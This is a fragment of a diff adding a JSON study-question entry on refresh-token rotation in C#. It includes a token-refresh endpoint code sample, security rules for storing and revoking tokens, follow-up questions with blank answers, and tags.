HashToken(request.RefreshToken);\n    var stored = await _db.RefreshTokens\n        .FirstOrDefaultAsync(t => t.TokenHash == tokenHash \n                               && !t.IsRevoked \n                               && t.ExpiresAt > DateTime.UtcNow);\n    \n    if (stored == null) return Unauthorized(\"Invalid or expired refresh token\");\n    \n    // Rotate: revoke old token, issue new pair\n    stored.IsRevoked = true;\n    \n    var newAccessToken  = _jwtService.GenerateAccessToken(stored.UserId);\n    var newRefreshToken = GenerateRefreshToken();\n    \n    _db.RefreshTokens.Add(new RefreshToken {\n        TokenHash  = HashToken(newRefreshToken),\n        UserId     = stored.UserId,\n        ExpiresAt  = DateTime.UtcNow.AddDays(7)\n    });\n    \n    await _db.SaveChangesAsync();\n    \n    return Ok(new { accessToken = newAccessToken, refreshToken = newRefreshToken });\n}\n\nprivate string GenerateRefreshToken()\n    => Convert.ToBase64String(RandomNumberGenerator.GetBytes(64));</code></pre>\n\n<h4>Security rules:</h4>\n<ul>\n<li><strong>Rotate refresh tokens</strong> on every use — if a stolen token is used, you detect it when the legitimate user's token is rejected</li>\n<li>Store tokens <em>hashed</em> in DB, never plaintext</li>\n<li>Revoke on logout — clear from DB</li>\n<li>Store access token in memory (JS), refresh token in httpOnly cookie</li>\n<li>Refresh tokens <em>must</em> be revokable (unlike stateless JWTs)</li>\n</ul>",
+      "followUps": [
+        {
+          "question": "Where should you store access tokens and refresh tokens on the client?",
+          "answer": ""
+        },
+        {
+          "question": "What is refresh token rotation and why does it help detect theft?",
+          "answer": ""
+        },
+        {
+          "question": "How do you invalidate all active sessions for a user (e.g., after password change)?",
+          "answer": ""
+        }
+      ],
+      "tip": "Rotate refresh tokens on every use — if you detect an already-used token, it means token theft — revoke ALL tokens for that user immediately.",
+      "tags": [
+        "auth",
+        "jwt",
+        "refresh-token",
+        "token-rotation",
+        "authentication",
+        "security"
+      ],
+      "sortOrder": 10,
+      "isActive": true
+    }
+  ]
+}
